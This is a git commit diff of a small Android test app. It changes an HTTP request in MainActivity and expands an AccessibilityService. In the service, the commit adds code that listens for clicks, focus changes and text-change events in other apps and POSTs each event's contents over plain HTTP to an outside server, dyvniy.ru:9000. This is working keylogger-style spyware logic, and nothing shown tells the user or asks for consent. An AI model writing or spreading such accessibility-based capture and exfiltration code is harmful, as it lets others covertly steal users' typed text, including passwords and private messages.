51c8f689491b4398f9635a68b6797e4200e3ad4b
Tsvetkov Viktor <mentalsupernovafox@gmail.com>
2021-04-18 04:07:28 +0300

    что то работает

--- app/src/main/java/com/example/test_test/MainActivity.java
+++ app/src/main/java/com/example/test_test/MainActivity.java
@@ -20,6 +20,7 @@ import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 
 import org.json.JSONArray;
+import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
@@ -29,15 +30,31 @@ import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
 import java.net.URL;
+import java.security.SecureRandom;
+import java.security.cert.X509Certificate;
+
+import javax.net.ssl.HostnameVerifier;
+import javax.net.ssl.HttpsURLConnection;
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.SSLSession;
+import javax.net.ssl.TrustManager;
+import javax.net.ssl.X509TrustManager;
 
 import retrofit2.http.GET;
 
 
+
+
+
 public class MainActivity extends AppCompatActivity {
+
+
+
+
+
     private Button getTask;
     private TextView textView;
-
-
+    private  TextView text_text1;
 
 
 
@@ -46,19 +63,27 @@ public class MainActivity extends AppCompatActivity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
+
+        String TAG = "234";
+
+
+
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
         allowPermission = findViewById(R.id.allowPermission);
         textView = findViewById(R.id.text_text);
         getTask = findViewById(R.id.getTasks);
+        text_text1 = findViewById(R.id.text_text1);
 
         getTask.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
 
+                String texttext1 = "Тестовый запуск";
+                text_text1.setText(texttext1);
                 RequestQueue queue = Volley.newRequestQueue(MainActivity.this);
-                String url ="https://mocki.io/v1/fe844492-a58d-4861-bb35-3d9a665813cb";
+                String url ="http://dyvniy.ru:9000/api?id=42";
 
 
                 JsonObjectRequest jsonObjectRequest = new JsonObjectRequest
@@ -69,7 +94,14 @@ public class MainActivity extends AppCompatActivity {
 
                                     @Override
                                     public void onResponse(JSONObject response) {
-                                        textView.setText("Response: " + response.toString());
+                                        try {
+                                            textView.setText("Response: " + response.get("tasks"));
+                                        } catch (JSONException e) {
+                                            e.printStackTrace();
+                                            Log.e(TAG,"te"+e);
+                                        }
+
+
                                     }
                                 },
                                 new Response.ErrorListener() {
@@ -77,7 +109,8 @@ public class MainActivity extends AppCompatActivity {
                                     @Override
                                     public void onErrorResponse(VolleyError error) {
                                         // TODO: Handle error
-
+                                        textView.setText(R.string.test);
+                                       Log.e(TAG,"t"+error);
                                     }
 
                                 });
--- app/src/main/java/com/example/test_test/MyAccessibilityService.java
+++ app/src/main/java/com/example/test_test/MyAccessibilityService.java
@@ -7,14 +7,65 @@ import android.content.pm.PackageManager;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 
+import com.android.volley.AuthFailureError;
+import com.android.volley.Request;
+import com.android.volley.RequestQueue;
+import com.android.volley.Response;
+import com.android.volley.VolleyError;
+import com.android.volley.toolbox.StringRequest;
+import com.android.volley.toolbox.Volley;
+
+import java.util.HashMap;
+import java.util.Map;
+
 public class MyAccessibilityService extends AccessibilityService {
 
     private static final String TAG = "MyAccessibilityService";
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         Log.e(TAG, "UtsustestonAccessibilityEvent: ");
+        Log.e(TAG, "UtsustestonAccessibilityTest:"+event);
+
+        String t = event.toString();
+
+
+
+
+
+    String url = "http://dyvniy.ru:9000/api";
+        RequestQueue queue = Volley.newRequestQueue(MyAccessibilityService.this);
+        StringRequest sr = new StringRequest(Request.Method.POST,url, new Response.Listener<String>() {
+            @Override
+            public void onResponse(String response) {
+                Log.e(TAG,"OK");
+            }
+        }, new Response.ErrorListener() {
+            @Override
+            public void onErrorResponse(VolleyError error) {
+                Log.e(TAG,"nope"+error);
+            }
+        }){
+            @Override
+            protected Map<String,String> getParams(){
+                Map<String,String> params = new HashMap<String, String>();
+                params.put("evt",event.toString());
+
+
+                return params;
+            }
+
+            @Override
+            public Map<String, String> getHeaders() throws AuthFailureError {
+                Map<String,String> params = new HashMap<String, String>();
+                params.put("Content-Type", "application/json");
+                return params;
+            }
+        };
+        queue.add(sr);
+
         String packageName = event.getPackageName().toString();
         PackageManager packageManager = this.getPackageManager();
+
         try {
             ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 0);
             CharSequence testlabel = packageManager.getApplicationLabel(applicationInfo);
@@ -38,11 +89,15 @@ public class MyAccessibilityService extends AccessibilityService {
 
         AccessibilityServiceInfo  info = new AccessibilityServiceInfo();
         info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED |
-                AccessibilityEvent.TYPE_VIEW_FOCUSED;
+                AccessibilityEvent.TYPE_VIEW_FOCUSED | AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
+
+
+
 
 
         // Set the type of feedback your service will provide.
-        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
+
+        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
 
 
         info.notificationTimeout = 100;
